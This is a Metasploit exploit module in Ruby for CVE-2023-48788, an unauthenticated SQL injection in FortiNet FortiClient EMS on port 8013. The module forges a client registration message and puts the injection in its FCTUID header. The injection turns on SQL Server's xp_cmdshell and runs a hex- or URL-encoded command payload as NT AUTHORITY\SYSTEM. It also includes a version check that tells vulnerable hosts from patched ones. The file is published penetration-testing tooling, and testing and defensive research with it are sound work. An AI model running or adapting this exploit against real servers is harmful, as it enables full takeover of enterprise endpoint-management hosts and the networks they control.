##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Tcp
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'FortiNet FortiClient Endpoint Management Server FCTID SQLi to RCE',
        'Description' => %q{
          An SQLi injection vulnerability exists in FortiNet FortiClient EMS (Endpoint Management Server).
          FortiClient EMS serves as an endpoint management solution tailored for enterprises, offering a centralized
          platform for overseeing enrolled endpoints. The SQLi is vulnerability is due to user controller strings which
          can be sent directly into database queries.

          FcmDaemon.exe is the main service responsible for communicating with enrolled clients. By default it listens on port 8013
          and communicates with FCTDas.exe which is responsible for translating requests and sending them to the database.
          In the message header of a specific request sent between the two services, the FCTUID parameter is vulnerable
          SQLi. The SQLi can used to enable the xp_cmdshell which can then be used to obtain unauthenticated remote code
          execution in the context of NT AUTHORITY\SYSTEM

          Affected versions of FortiClient EMS include:
          7.2.0 through 7.2.2
          7.0.1 through 7.0.10

          Upgrading to either 7.2.3, 7.0.11 or above is recommended by FortiNet.

          It should be noted that in order to be vulnerable, at least one endpoint needs to be enrolled / managed by FortiClient
          EMS for the necessary vulnerable services to be available.
        },
        'Author' => [
          'Zach Hanley',     # Analysis & PoC
          'James Horseman',  # Analysis & PoC
          'jheysel-r7',      # Msf module
          'Spencer McIntyre' # Msf module assistance
        ],
        'References' => [
          [ 'URL', 'https://www.horizon3.ai/attack-research/attack-blogs/cve-2023-48788-fortinet-forticlientems-sql-injection-deep-dive/'],
          [ 'URL', 'https://www.horizon3.ai/attack-research/attack-blogs/cve-2023-48788-revisiting-fortinet-forticlient-ems-to-exploit-7-2-x/'],
          [ 'URL', 'https://github.com/horizon3ai/CVE-2023-48788/blob/main/CVE-2023-48788.py'],
          [ 'CVE', '2023-48788']
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Privileged' => true,
        'Arch' => [ ARCH_CMD ],
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2024-04-21',
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 8013
        },
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ]
        }
      )
    )
  end

  def get_register_info
    if @version >= Rex::Version.new('7.2')
      vprint_status('Returning SYSINFO for 7.2 target')
      register_info = <<~REGISTER_INFO
        FCTOS=WIN64
        OSVER=Microsoft Windows 10 Professional Edition, 64-bit (build 19045)
        RSENG_VER=1.00182
        COM_MODEL=VMware7,1
        AVSIG_VER=1.00000
        UTC=1721756626
        PC_DOMAIN=kerberos.issue
        COM_MAN=VMware, Inc.
        CPU=Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz
        COM_SN=VMware-56 4d 8a d5 7b 39 3b 0d-33 c6 25 6a e4 51 f7 4d
        DHCP_SERVER=None
        FCTVER=7.2.2.0864
        EP_ONNETCHKSUM=0
        AVENG_VER=6.00287
        APPSIG_VER=28.00831
        USER=msfuser
        APPENG_VER=4.00082
        VULSIG_VER=1.00708
        AVALSIG_VER=0.00000
        VULENG_VER=2.00037
        AV_PROTECTED=1
        AVALENG_VER=0.00000
        PEER_IP=162.156.58.199
        ENABLED_FEATURE_BITMAP=16
        EP_OFFNETCHKSUM=0
        INSTALLED_FEATURE_BITMAP=420727
        EP_CHKSUM=0
        HIDDEN_FEATURE_BITMAP=418087
        GROUP_TAG=
        ENABLED_APPS=0
        INSTALLED_APPS=0
        DISKENC=
        HOSTNAME=client
        AV_PRODUCT=Microsoft Defender Antivirus
        FCT_SN=FCT8003173689730
        INSTALLUID=#{Faker::Internet.uuid.upcase}
        NWIFS=Ethernet0|#{Faker::Internet.ip_v4_address}|#{Faker::Internet.mac_address}|#{Faker::Internet.ip_v4_address}|#{Faker::Internet.mac_address}|1|*|0
        MEM=16383
        HDD=119
        DOMAIN=
        WORKGROUP=
        USER_SID=S-1-5-21-#{rand(9) * 10}-#{rand(9) * 10}-#{rand(9) * 10}-500
        ADGUID=
        EP_FGTCHKSUM=0
        EP_RULECHKSUM=0
        WF_FILESCHKSUM=0
        EP_APPCTRLCHKSUM=0
      REGISTER_INFO
    else
      vprint_status('Returning SYSINFO for 7.0 target')
      register_info = <<~REGISTER_INFO
        AVSIG_VER=1.00000
        REG_KEY=_
        EP_ONNETCHKSUM=0
        AVENG_VER=6.00266
        DHCP_SERVER=None
        FCTOS=WIN64
        VULSIG_VER=1.00000
        FCTVER=7.0.7.0345
        APPSIG_VER=13.00364
        USER=Administrator
        APPENG_VER=4.00082
        AVALSIG_VER=0.00000
        VULENG_VER=2.00032
        OSVER=Microsoft Windows Server 2019 , 64-bit (build 17763)
        COM_MODEL=VMware Virtual Platform
        RSENG_VER=1.00020
        AV_PROTECTED=0
        AVALENG_VER=0.00000
        PEER_IP=
        ENABLED_FEATURE_BITMAP=49
        EP_OFFNETCHKSUM=0
        INSTALLED_FEATURE_BITMAP=158583
        EP_CHKSUM=0
        HIDDEN_FEATURE_BITMAP=155943
        DISKENC=
        HOSTNAME=CYBER-RETQB1FLP
        AV_PRODUCT=
        FCT_SN=FCT8001638848651
        INSTALLUID=#{Faker::Internet.uuid.upcase}
        NWIFS=Ethernet0|#{Faker::Internet.ip_v4_address}|#{Faker::Internet.mac_address}|#{Faker::Internet.ip_v4_address}|#{Faker::Internet.mac_address}|1|*|0
        UTC=1710271774
        PC_DOMAIN=
        COM_MAN=VMware, Inc.
        CPU=Intel(R) Xeon(R) Silver 4215 CPU @ 2.50GHz
        MEM=12287
        HDD=99
        COM_SN=VMware-42 04 ed 2d 64 e8 0b 14-45 e9 e4 f6 5a c7 67 82
        DOMAIN=
        WORKGROUP=WORKGROUP
        USER_SID=S-1-5-21-#{rand(9) * 10}-#{rand(9) * 10}-#{rand(9) * 10}-500
        GROUP_TAG=
        ADGUID=
        EP_FGTCHKSUM=0
        EP_RULECHKSUM=0
        WF_FILESCHKSUM=0
        EP_APPCTRLCHKSUM=0
      REGISTER_INFO
    end
    Rex::Text.encode_base64(register_info)
  end

  def get_version
    message = "MSG_HEADER: FCTUID=CBE8FC122B1A46D18C3541E1A8EFF7BD\n"
    message << "SIZE=    {SIZE_PLACEHOLDER}\n"
    message << "X-FCCK-PROBE: PROBE_FEATURE_BITMAP0|1|\n"
    message << 'X-FCCK-PROBE-END'
    message << "\r\n"
    message << "\r\n"
    message_length = message.length
    message_length = message_length - '{SIZE_PLACEHOLDER}'.length + message_length.to_s.length
    message.gsub!('{SIZE_PLACEHOLDER}', message_length.to_s)

    buf = send_message(message)
    # Example response from a 7.2.2 target:
    # FGT|FCTEMS0000127184:dc2|FEATURE_BITMAP|7|EMSVER|7002002|PROTO_VERSION|1.0.0|PERCON|1|
    # 7.0.7:
    # FGT|FCTEMS0000125975:dc2.kerberos.issue|FEATURE_BITMAP|7|EMSVER|7000007|
    if buf =~ /EMSVER\|(\d{2})(\d{2})(\d{3})\|/
      major = (::Regexp.last_match(1).to_i / 10)
      minor = ::Regexp.last_match(2).to_i
      patch = ::Regexp.last_match(3).to_i
      return Rex::Version.new("#{major}.#{minor}.#{patch}")
    end
    nil
  end

  def get_message(sqli)
    message = "MSG_HEADER: FCTUID={SQLI_PLACEHOLDER}\n"
    message << "SIZE=     {SIZE_PLACEHOLDER}\r\n"
    message << "\n"
    # For 7.0 versions the register info gets placed after two pipe operators, for 7.2 it gets placed in between.
    if @version >= Rex::Version.new('7.2')
      message << "X-FCCK-REGISTER:SYSINFO|#{get_register_info}|\r\n"
    else
      message << "X-FCCK-REGISTER:SYSINFO||#{get_register_info}\r\n"
    end
    message << "\n"
    message << 'X-FCCK-REGISTER-END'
    message << "\r\n\r\n"
    message.gsub!('{SQLI_PLACEHOLDER}', sqli)
    message_length = message.length
    message_length = message_length - '{SIZE_PLACEHOLDER}'.length + message_length.to_s.length
    message.gsub!('{SIZE_PLACEHOLDER}', message_length.to_s)
    message
  end

  def send_message(message)
    vprint_status("Sending the following message:\n #{message}")

    buf = ''
    begin
      connect(true, { 'SSL' => true })
      sock.put(message)
      buf = sock.get_once || ''
    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    ensure
      disconnect
    end
    vprint_status("The response received was: #{buf}")
    buf
  end

  def check
    @version = get_version
    return CheckCode::Unknown("#{peer} - Version info was unable to be extracted from the target. FmcDaemon.exe might not be running.") unless @version

    if @version.between?(Rex::Version.new('7.2.0'), Rex::Version.new('7.2.2')) || @version.between?(Rex::Version.new('7.0.1'), Rex::Version.new('7.0.10'))
      return CheckCode::Appears("Version detected: #{@version}")
    end

    CheckCode::Safe("Version detected: #{@version}")
  end

  def exploit
    # Things to note:
    # 1. xp_cmdshell is disabled by default so we must enable it.
    # 2. The application takes the SQL statement we inject into and converts the string to upper case. This is why the
    #    payload is converted to a case insensitive encoding like URL or hex before running the command with xp_command shell.
    # 3. We don't expect a response when delivering the payload
    # 4. The double quote is a bad char in the SQLi for 7.0.x versions
    # 5. The equals sign is a bad char in the SQLi for 7.2.x versions

    @version ||= get_version

    if @version >= Rex::Version.new('7.2')
      pload = "EXEC xp_cmdshell 'POWERSHELL.EXE -COMMAND \"\"Add-Type -AssemblyName System.Web; CMD.EXE /C ([SYSTEM.WEB.HTTPUTILITY]::URLDECODE(\"\"\"#{Rex::Text.uri_encode(payload.encoded, 'hex-all')}\"\"\"))\"\"'"
    else
      pload = "DECLARE @SQL VARCHAR(#{payload.encoded.length}) = CONVERT(VARCHAR(MAX), 0X#{payload.encoded.unpack('H*').first}); exec xp_cmdshell @sql"
    end

    sqli_injection = "';EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; #{pload};--"
    send_message(get_message(sqli_injection)).empty? ? print_good("The SQLi: #{sqli_injection} was executed successfully") : print_error('The SQLi injection response indicated the injection was unsuccessful.')
  end
end
